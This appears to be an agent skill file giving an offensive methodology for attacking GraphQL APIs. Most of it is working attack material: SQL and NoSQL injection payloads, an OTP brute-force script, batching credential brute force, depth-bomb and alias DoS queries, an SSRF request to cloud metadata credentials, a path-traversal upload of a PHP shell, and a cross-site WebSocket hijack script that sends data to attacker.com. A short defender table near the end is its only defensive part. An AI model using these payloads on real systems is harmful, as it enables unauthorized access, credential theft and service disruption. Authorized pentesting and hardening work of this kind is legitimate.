---
name: offensive-graphql
description: "Offensive methodology for attacking GraphQL APIs during penetration tests and bug bounty engagements. Covers the full attack lifecycle: endpoint discovery, introspection abuse and blind schema reconstruction when introspection is disabled, authentication and authorization bypass through Relay node IDs and nested object traversal, injection via variables and directives, query batching for brute force and OTP bypass, denial of service through depth bombs and alias amplification, WebSocket subscription hijacking, information disclosure through verbose errors and field suggestion oracles, and file upload abuse via the multipart GraphQL specification. Includes tool-specific guidance for InQL, graphql-cop, CrackQL, BatchQL, Altair, GraphQL Voyager, and clairvoyance. Trigger on: GraphQL, graphql, introspection query, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security, graphql-cop, InQL, CrackQL, BatchQL, Relay node, alias amplification, subscription abuse, multipart upload GraphQL, schema enumeration, __schema, __type."
---

# Offensive GraphQL

GraphQL consolidates an entire API surface behind a single endpoint, which
makes it a high-value target during web application assessments. Unlike REST,
where each route maps to a discrete resource, a GraphQL schema exposes every
type, field, mutation, and subscription in one queryable structure. Attackers
who obtain or reconstruct that schema gain a complete map of the application's
data model before writing a single exploit. This skill walks you through each
phase of a GraphQL engagement, from discovery through exploitation, with
concrete queries, tool invocations, and chaining patterns you can adapt to
real targets.

## Quick Workflow

1. Discover the endpoint -- probe common paths, inspect client-side JS bundles, and check WebSocket upgrade headers.
2. Fingerprint the implementation -- use graphw00f to identify Apollo, Yoga, Hasura, Ariadne, or another engine so you can tailor payloads.
3. Dump or reconstruct the schema -- run a full introspection query; if blocked, fall back to field suggestion probing or clairvoyance.
4. Map the attack surface -- feed the schema into GraphQL Voyager or InQL to visualize types, mutations, and relationships.
5. Test authentication and authorization -- check every query and mutation with no token, low-privilege tokens, and cross-user tokens; decode Relay node IDs to find IDOR vectors.
6. Inject through resolvers -- pass SQL, NoSQL, and OS command payloads through string arguments and variables.
7. Abuse batching -- send arrayed operations to brute-force credentials, bypass OTP, and evade rate limits.
8. Stress depth and complexity -- craft nested queries, alias fans, and circular fragments to test DoS resilience.
9. Probe subscriptions -- connect over WebSocket with expired or missing tokens and subscribe to sensitive event streams.
10. Exfiltrate via errors -- trigger verbose stack traces, type mismatches, and field suggestion responses to leak internal details.
11. Test file upload -- use the multipart GraphQL specification to upload oversized or malicious files through mutations.
12. Document, chain, and escalate -- combine findings into multi-step attack chains and write them up with proof-of-concept queries.

---

## 1 -- Endpoint Discovery and Fingerprinting

You start by locating the GraphQL endpoint. Most implementations register on
predictable paths, but some hide behind custom routes or reverse proxies.

Common endpoint paths to probe:

```text
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graphql/console
/playground
/explorer
/query
```

Send a simple POST to each candidate with a minimal query body:

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .
```

A response containing `{"data":{"__typename":"Query"}}` confirms a live
GraphQL endpoint. Some servers also accept GET requests with the query as a
URL parameter:

```bash
curl -s "https://target.com/graphql?query=\{__typename\}"
```

Once you confirm the endpoint, fingerprint the implementation with graphw00f:

```bash
python3 graphw00f.py -t https://target.com/graphql
```

The engine identity (Apollo Server, Yoga, Hasura, Ariadne, Strawberry,
graphql-ruby, etc.) determines default behaviors -- whether introspection is
on by default, how errors are formatted, and which batching syntax the server
accepts.

---

## 2 -- Introspection and Blind Schema Reconstruction

### Full Introspection Dump

When introspection is enabled, you can pull the entire schema in a single
request. This is the most valuable reconnaissance step in any GraphQL
engagement.

```graphql
query FullIntrospection {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          type { ...TypeRef }
          defaultValue
        }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
      }
      inputFields {
        name
        type { ...TypeRef }
        defaultValue
      }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes { ...TypeRef }
    }
    directives {
      name
      description
      locations
      args {
        name
        type { ...TypeRef }
        defaultValue
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

Pipe the result into GraphQL Voyager or InQL for visual exploration. In Burp
Suite, load InQL and point it at the endpoint -- it parses the schema and
generates individual queries for every field and mutation automatically.

### Targeted Type Queries

When you only need details about a specific type, use `__type`:

```graphql
query {
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

This is useful when full introspection is disabled but `__type` lookups are
still permitted -- a common misconfiguration where the server blocks the
`__schema` root field but forgets to block `__type`.

### Bypassing Disabled Introspection

When introspection is fully disabled, you reconstruct the schema through
alternative channels.

**Field suggestion oracle.** Most GraphQL engines return "Did you mean..."
suggestions when you query a non-existent field. You use this as a schema
oracle by submitting plausible field names and harvesting the suggestions:

```graphql
query {
  __typename
  aaa
}
```

A typical response:

```json
{
  "errors": [
    {
      "message": "Cannot query field \"aaa\" on type \"Query\". Did you mean \"user\", \"users\", \"admin\"?",
      "locations": [{"line": 3, "column": 3}]
    }
  ]
}
```

You now know the Query type has `user`, `users`, and `admin` fields. Repeat
this process systematically. The tool clairvoyance automates this entirely:

```bash
python3 clairvoyance.py -t https://target.com/graphql -w wordlist.txt -o schema.json
```

It iterates through a wordlist, collects suggestions, and assembles a
reconstructed schema.

**Apollo Sandbox and Studio.** If the target runs Apollo Server, navigate to
`https://target.com/graphql` in a browser. Apollo Server v3+ serves Apollo
Sandbox by default, which performs introspection client-side even when the
production toggle is supposedly off. The sandbox may also expose the schema
through the Apollo Studio explorer if the server is registered with Apollo
Studio.

**Client-side bundle analysis.** Search JavaScript bundles served by the
application for query strings, fragment definitions, and type names:

```bash
# Download and search JS bundles for GraphQL artifacts
curl -s https://target.com/static/js/main.js | grep -oP '(query|mutation|fragment)\s+\w+'
```

**graphql-cop probe.** Run graphql-cop to check for introspection status,
field suggestions, and other misconfigurations in one pass:

```bash
python3 graphql-cop.py -t https://target.com/graphql
```

It reports whether introspection is enabled, whether field suggestions leak
type information, whether GET-based queries are accepted (CSRF risk), and
whether batching is unrestricted.

---

## 3 -- Authentication and Authorization Bypass

GraphQL authorization bugs are pervasive because developers must implement
field-level and type-level checks manually in each resolver. Missing checks on
a single nested field can expose the entire object graph.

### IDOR Through Relay Node IDs

Applications using the Relay specification expose a global `node` interface
that resolves any object by its opaque ID. These IDs are typically
base64-encoded strings in the form `Type:numericID`:

```bash
echo -n "VXNlcjoxMjM=" | base64 -d
# Output: User:123
```

Forge IDs for other users and query them through the node interface:

```graphql
query {
  node(id: "VXNlcjoxMjQ=") {
    ... on User {
      id
      email
      role
      ssn
    }
  }
}
```

If the resolver does not enforce ownership checks, you retrieve another user's
data. Enumerate IDs sequentially by encoding `User:1`, `User:2`, etc.:

```bash
for i in $(seq 1 100); do
  id=$(echo -n "User:$i" | base64)
  echo "{\"query\": \"{ node(id: \\\"$id\\\") { ... on User { id email role } } }\"}"
done | xargs -I{} curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{}'
```

### Nested Object Authorization Gaps

Authorization is often enforced on the top-level query but not on nested
relationships. If you can access your own `Order` object, check whether its
`customer` field lets you traverse to another user:

```graphql
query {
  myOrders {
    id
    customer {
      id
      email
      paymentMethods {
        cardNumber
        expirationDate
      }
    }
  }
}
```

The resolver for `myOrders` filters by your user ID, but the `customer`
resolver on the Order type may eagerly load the associated user without
verifying that you are allowed to see that user's payment methods.

### Relay Pagination and Cursor Manipulation

Relay-style pagination uses opaque cursors. Decode them (often base64 of an
offset or timestamp) and manipulate the value:

```graphql
query {
  users(first: 10, after: "Y3Vyc29yOjk5OQ==") {
    edges {
      node {
        id
        email
      }
      cursor
    }
    pageInfo {
      hasNextPage
      endCursor
    }
  }
}
```

If the cursor decodes to `cursor:999`, set it to `cursor:0` to start from the
beginning of the dataset, potentially accessing records you should not see.

### Mutation Authorization

Test every mutation with multiple privilege levels. Common targets:

```graphql
mutation {
  updateUser(id: "OTHER_USER_ID", input: { role: "ADMIN" }) {
    id
    role
  }
}

mutation {
  deleteAccount(userId: "OTHER_USER_ID") {
    success
  }
}
```

Send these with an unauthenticated session, a low-privilege token, and a
cross-tenant token.

---

## 4 -- Injection Through Resolvers

GraphQL variables and arguments flow directly into resolver functions. If a
resolver constructs database queries by string concatenation instead of
parameterized queries, you have classic injection vectors.

### SQL Injection via Variables

```graphql
query GetUser($name: String!) {
  user(name: $name) {
    id
    email
  }
}
```

Variables payload:

```json
{
  "name": "admin' OR 1=1 --"
}
```

If the resolver does `SELECT * FROM users WHERE name = '${args.name}'`, this
dumps all users. Escalate with UNION-based injection:

```json
{
  "name": "' UNION SELECT username, password FROM admin_users --"
}
```

### NoSQL Injection

For resolvers backed by MongoDB or similar:

```json
{
  "filter": {"username": {"$ne": ""}, "password": {"$ne": ""}}
}
```

Or through a JSON string argument:

```graphql
query {
  search(filter: "{\"$where\": \"sleep(5000)\"}")  {
    results
  }
}
```

### Directive Injection

Custom directives may accept arguments that are processed server-side. If the
server uses a custom `@constraint` or `@auth` directive, test whether you can
override its behavior:

```graphql
query {
  sensitiveData @skip(if: false) @deprecated(reason: "test") {
    secret
  }
}
```

Directive flooding -- attaching thousands of `@include(if: true)` directives
to a single field -- can also crash parsers (CVE-2024-47614 in async-graphql):

```graphql
query {
  __typename @include(if: true) @include(if: true) @include(if: true)
  # ... repeat 10,000 times
}
```

### SSRF Through Resolver Arguments

If a mutation accepts a URL argument (for webhooks, avatars, imports), test
for SSRF:

```graphql
mutation {
  setAvatar(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    success
  }
}
```

---

## 5 -- Batching Attacks

GraphQL servers commonly accept arrays of operations in a single HTTP request.
This enables powerful brute-force and bypass attacks because back-end rate
limiters often count HTTP requests, not individual operations within a batch.

### Credential Brute Force

```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password4\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password5\") { token } }"}
]
```

A single HTTP request carries hundreds of login attempts. The rate limiter
sees one request and lets it through.

### OTP / 2FA Bypass

If the application uses a numeric OTP (4-6 digits), batch all possible values:

```python
import json, requests

ops = []
for code in range(0, 10000):
    otp = str(code).zfill(4)
    ops.append({
        "query": f'mutation {{ verifyOTP(code: "{otp}") {{ success token }} }}'
    })

# Send in chunks of 500
for i in range(0, len(ops), 500):
    r = requests.post(
        "https://target.com/graphql",
        json=ops[i:i+500],
        headers={"Authorization": "Bearer <session_token>"}
    )
    for idx, result in enumerate(r.json()):
        if result.get("data", {}).get("verifyOTP", {}).get("success"):
            print(f"Valid OTP: {str(i + idx).zfill(4)}")
            break
```

### Alias-Based Batching

Some servers reject array batching but allow alias-based batching within a
single query document:

```graphql
query {
  attempt1: login(user: "admin", pass: "pass1") { token }
  attempt2: login(user: "admin", pass: "pass2") { token }
  attempt3: login(user: "admin", pass: "pass3") { token }
  attempt4: login(user: "admin", pass: "pass4") { token }
  attempt5: login(user: "admin", pass: "pass5") { token }
}
```

Use BatchQL to automate this:

```bash
python3 batch-ql.py -e https://target.com/graphql -q 'mutation { login(user: "admin", pass: "§pass§") { token } }' -w passwords.txt
```

And CrackQL for more advanced batching with JWT and session management:

```bash
python3 CrackQL.py -t https://target.com/graphql \
  -q query.graphql \
  -i inputs.csv \
  --batch-size 500
```

---

## 6 -- Denial of Service

GraphQL's flexible query language makes it inherently susceptible to
resource exhaustion attacks unless the server enforces strict cost controls.

### Deeply Nested Queries (Depth Bomb)

Exploit circular relationships in the schema. If `User` has `friends` that
returns `[User]`, you can nest indefinitely:

```graphql
query DepthBomb {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    id
                    email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Each level multiplies the number of database queries exponentially (N+1
problem). Eight levels deep on a user with 100 friends each triggers 100^8
resolver calls.

### Alias Amplification

Request the same expensive field thousands of times using aliases:

```graphql
query AliasAmplification {
  a1: expensiveReport(year: 2024) { data }
  a2: expensiveReport(year: 2024) { data }
  a3: expensiveReport(year: 2024) { data }
  # ... repeat 1000 times
}
```

Each alias invokes the resolver independently. If the resolver queries a
database or external service, you multiply the back-end load by the alias
count.

### Circular Fragment Spread

Some older implementations do not detect circular fragment references:

```graphql
fragment A on User {
  friends {
    ...B
  }
}

fragment B on User {
  friends {
    ...A
  }
}

query {
  user(id: 1) {
    ...A
  }
}
```

Compliant servers reject this at validation, but misconfigured or custom
implementations may attempt to resolve it, causing infinite recursion and
stack overflow.

### Incremental Delivery Abuse

If the server supports `@defer` and `@stream`, attach them to expensive
subtrees to force the server to hold connections open and compute partial
results in parallel:

```graphql
query {
  users(first: 1000) @stream(initialCount: 1) {
    id
    orders @defer {
      total
      items @stream(initialCount: 1) {
        name
        price
      }
    }
  }
}
```

---

## 7 -- Subscription Abuse and WebSocket Hijacking

GraphQL subscriptions typically run over WebSocket connections using the
`graphql-ws` or older `subscriptions-transport-ws` protocol. These
long-lived connections are a distinct attack surface.

### Unauthenticated Subscription

Connect to the WebSocket endpoint and subscribe without providing
authentication in the `connection_init` payload:

```json
{"type": "connection_init", "payload": {}}
```

Then subscribe to a sensitive event stream:

```json
{
  "id": "1",
  "type": "subscribe",
  "payload": {
    "query": "subscription { newOrder { id customer { email } total } }"
  }
}
```

If the server does not validate the connection_init payload, you receive
real-time events for all new orders.

### Token Expiry on Long-Lived Connections

WebSocket connections persist after the initial handshake. If the server
validates the JWT only during `connection_init` but not on subsequent
messages, a token that expires mid-session remains valid for the life of the
connection. Test this by:

1. Connecting with a valid short-lived token.
2. Waiting for the token to expire.
3. Sending a new subscription -- if it succeeds, the server does not
   re-validate tokens.

### Cross-User Subscription Leaks

If subscription IDs are predictable or sequential, attempt to receive events
intended for other users by guessing subscription identifiers or manipulating
the `id` field in the subscribe message.

### WebSocket CSWSH (Cross-Site WebSocket Hijacking)

If the WebSocket endpoint relies on cookies for authentication and does not
validate the `Origin` header, you can hijack the connection from a malicious
page:

```html
<script>
  var ws = new WebSocket("wss://target.com/graphql", "graphql-ws");
  ws.onopen = function() {
    ws.send(JSON.stringify({type: "connection_init", payload: {}}));
    ws.send(JSON.stringify({
      id: "1",
      type: "subscribe",
      payload: {query: "subscription { sensitiveEvent { data } }"}
    }));
  };
  ws.onmessage = function(e) {
    fetch("https://attacker.com/collect?d=" + btoa(e.data));
  };
</script>
```

---

## 8 -- Information Disclosure

### Verbose Error Messages

GraphQL engines often return detailed error messages that reveal internal
implementation details:

```graphql
query {
  user(id: "abc") {
    id
  }
}
```

Response exposing backend details:

```json
{
  "errors": [
    {
      "message": "invalid input syntax for type integer: \"abc\"",
      "locations": [{"line": 2, "column": 3}],
      "extensions": {
        "code": "INTERNAL_SERVER_ERROR",
        "exception": {
          "stacktrace": [
            "Error: invalid input syntax for type integer: \"abc\"",
            "    at /app/node_modules/pg/lib/client.js:526:17",
            "    at /app/src/resolvers/user.js:42:12"
          ]
        }
      }
    }
  ]
}
```

This reveals the database driver (PostgreSQL via `pg`), the resolver file
path, and line numbers. Feed this information into targeted injection payloads.

### Field Suggestion as Schema Oracle

Even when introspection is disabled, the "Did you mean" feature acts as a
side channel. Systematically iterate through prefixes:

```text
Query field "a" -> Did you mean "admin", "account"?
Query field "b" -> Did you mean "billing", "blog"?
Query field "c" -> Did you mean "customer", "config", "cart"?
```

You reconstruct the full Query type field list without introspection. Then
repeat the process on each discovered type's fields by querying nested fields
with intentional typos.

### Hasura and Apollo-Specific Leaks

**Hasura:** Test header injection with `x-hasura-role` and `x-hasura-user-id`.
If the server trusts these headers without validation (common when the admin
secret is not required):

```bash
curl -s -X POST https://target.com/v1/graphql \
  -H "Content-Type: application/json" \
  -H "x-hasura-role: admin" \
  -H "x-hasura-user-id: 1" \
  -d '{"query": "{ users { id email password_hash } }"}'
```

**Apollo Server:** Check for schema exposure through persisted query
extensions and the Apollo Studio explorer. Query the `_service` field if
Apollo Federation is in use:

```graphql
query {
  _service {
    sdl
  }
}
```

This returns the full Schema Definition Language for the subgraph.

---

## 9 -- File Upload via Multipart GraphQL

The GraphQL multipart request specification (used by `graphql-upload`,
`apollo-upload-server`, and others) enables file uploads through mutations.
Test for path traversal, unrestricted file types, and oversized uploads.

```bash
curl -s -X POST https://target.com/graphql \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@malicious.php
```

Attack vectors to test:

- **Path traversal in the map field:** Manipulate the `map` JSON to write
  files outside the intended upload directory:
  `{"0": ["variables.file"], "path": "../../../etc/cron.d/shell"}`
- **Content-type trust:** Upload a `.php`, `.jsp`, or `.aspx` file and check
  whether the server validates content by magic bytes or trusts the
  Content-Type header.
- **Oversized uploads:** Send a multi-gigabyte file to test whether the server
  enforces upload size limits at the GraphQL layer.
- **Temp file exposure:** Some implementations write uploaded files to a
  predictable temporary path before processing -- check whether those temp
  files are accessible via the web server.

---

## Detection / Defender View

If you are writing a report or advising a client on hardening, these are the
controls that would have prevented or detected each attack category above.

| Attack Category | Detection / Prevention |
|---|---|
| Introspection abuse | Disable introspection in production (`introspection: false`). Monitor for `__schema` and `__type` in query logs. |
| Field suggestion oracle | Disable field suggestions in production (Apollo: `includeStacktraceInErrorResponses: false` and custom plugin to strip suggestions; Yoga: `maskedErrors`). |
| IDOR via node IDs | Enforce ownership checks in every resolver. Use opaque non-sequential identifiers (UUIDs). |
| Nested auth gaps | Implement schema-level authorization directives (e.g., `@auth`, `@hasRole`). Apply checks at every resolver, not just top-level queries. |
| SQL / NoSQL injection | Use parameterized queries exclusively. Never concatenate user input into query strings. |
| Batching brute force | Limit array batch size (e.g., max 5 operations per request). Rate-limit by operation count, not HTTP request count. |
| Alias amplification | Set alias count limits. Use query cost analysis (e.g., graphql-query-complexity, GraphQL Armor). |
| Depth bomb | Enforce max query depth (typically 7-10). Libraries: graphql-depth-limit, GraphQL Armor. |
| Subscription hijack | Validate authentication on every `connection_init` and re-validate tokens periodically. Enforce Origin header checks for WebSocket upgrades. |
| Verbose errors | Return generic error messages in production. Strip stack traces and internal paths. |
| File upload abuse | Validate file content by magic bytes, enforce size limits, store files outside the web root, and re-encode images. |
| CSRF | Require `Content-Type: application/json` (browsers cannot set this in simple cross-origin requests). Reject GET-based mutations. Validate Origin header. |

Key hardening tools:

- **GraphQL Armor** -- drop-in middleware for Apollo, Yoga, and Envelop that
  enforces depth limits, alias limits, cost analysis, and character limits.
- **Persisted queries** -- allowlist known operations and reject ad-hoc
  queries in production. Apollo supports Automatic Persisted Queries (APQ)
  with signature enforcement.
- **WAF rules** -- if you must use a WAF, configure it to parse the JSON body
  and inspect the `query` field, not just URL parameters. Naive WAFs miss
  POST-body payloads entirely.

---

## Engagement Cheatsheet

```text
RECON
  Endpoint discovery       curl POST /graphql, /v1/graphql, /api/graphql with {__typename}
  Fingerprint engine       graphw00f -t <url>
  Introspection dump       Full __schema query through Altair or InQL
  Config audit             graphql-cop -t <url>
  Schema visualization     Feed introspection JSON into GraphQL Voyager

BLIND SCHEMA RECOVERY (introspection disabled)
  Field suggestions        Query invalid fields, collect "Did you mean" responses
  Automated recovery       clairvoyance -t <url> -w wordlist.txt
  Client bundle mining     grep -oP '(query|mutation|fragment)\s+\w+' main.js
  Apollo sandbox           Navigate to endpoint in browser for Apollo Studio

AUTH TESTING
  Unauthenticated access   Replay every query/mutation with no Authorization header
  Horizontal escalation    Decode Relay node IDs, substitute other user IDs
  Vertical escalation      Test admin mutations with low-privilege tokens
  Nested traversal         Follow relationships to reach unauthorized objects
  Cursor manipulation      Decode Relay cursors, modify offset values

INJECTION
  SQLi via variables       {"name": "admin' OR 1=1 --"}
  NoSQL injection          {"filter": {"$ne": ""}}
  SSRF via URL arguments   Point URL fields at 169.254.169.254
  Directive flooding       10,000 @include(if: true) on a single field

BATCHING
  Array batching           [{"query":"mutation{login(...)}"}, ...]
  Alias batching           a1: login(...) a2: login(...) ...
  OTP exhaustion           Batch all 4-6 digit codes in chunks of 500
  Tooling                  CrackQL, BatchQL

DENIAL OF SERVICE
  Depth bomb               Nest circular relationships 8+ levels
  Alias amplification      1000+ aliases on an expensive resolver
  Fragment cycle           Circular fragment spreads (A -> B -> A)
  Incremental delivery     @defer/@stream on expensive subtrees

SUBSCRIPTION ABUSE
  No-auth subscribe        connection_init with empty payload
  Token expiry test        Connect, wait for JWT expiry, send new subscription
  CSWSH                    Cross-site WebSocket hijack via malicious page

FILE UPLOAD
  Multipart spec           -F operations=... -F map=... -F 0=@file
  Path traversal           Manipulate map JSON paths
  Type bypass              Upload executable with benign Content-Type

INFORMATION DISCLOSURE
  Verbose errors           Send type-mismatched arguments, observe stack traces
  Federation SDL           Query { _service { sdl } }
  Hasura header injection  x-hasura-role: admin without admin secret
```

---

## Key References

- GraphQL specification: https://spec.graphql.org/
- GraphQL multipart request specification: https://github.com/jaydenseric/graphql-multipart-request-spec
- InQL (Burp Suite extension): https://github.com/doyensec/inql
- graphql-cop (security auditor): https://github.com/dolevf/graphql-cop
- CrackQL (batching and brute force): https://github.com/nicholasaleks/CrackQL
- BatchQL (batch query tool): https://github.com/assetnote/batchql
- clairvoyance (schema reconstruction): https://github.com/nikitastupin/clairvoyance
- graphw00f (fingerprinting): https://github.com/dolevf/graphw00f
- GraphQL Voyager (schema visualization): https://graphql-kit.com/graphql-voyager/
- Altair GraphQL Client: https://altairgraphql.dev/
- GraphQL Armor (hardening middleware): https://github.com/Escape-Technologies/graphql-armor
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- HackTricks GraphQL: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- "Damn Vulnerable GraphQL Application" (practice target): https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
